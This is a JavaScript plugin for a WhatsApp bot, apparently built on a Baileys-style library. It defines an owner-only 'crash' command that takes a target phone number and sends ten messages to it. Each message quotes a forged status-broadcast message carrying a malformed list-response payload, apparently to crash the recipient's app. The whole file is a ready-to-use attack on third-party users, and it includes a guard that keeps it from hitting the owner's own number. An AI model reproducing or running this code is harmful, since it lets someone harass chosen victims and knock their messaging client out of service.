let handler = async (m, { conn, text, args, command, usedPrefix }) => {
if (!text) {
return conn.reply(m.chat, `• *Example :* ${usedPrefix}${command} 6288980870067`, m);
}
conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let number = text
if (number == nomorown) return conn.reply(m.chat, 'Tidak bisa mengirim crash ke nomer owner', m)
jumlah = `10`
for (let i = 0; i < jumlah; i++) {
const fbug = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `© Minkèe dev`
}}
}
conn.reply(`${number}@s.whatsapp.net`, `Hellow`, fbug)
await sleep(3000)
}
conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
handler.command = /^crash$/i
handler.owner = true
handler.limit = true

module.exports = handler

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}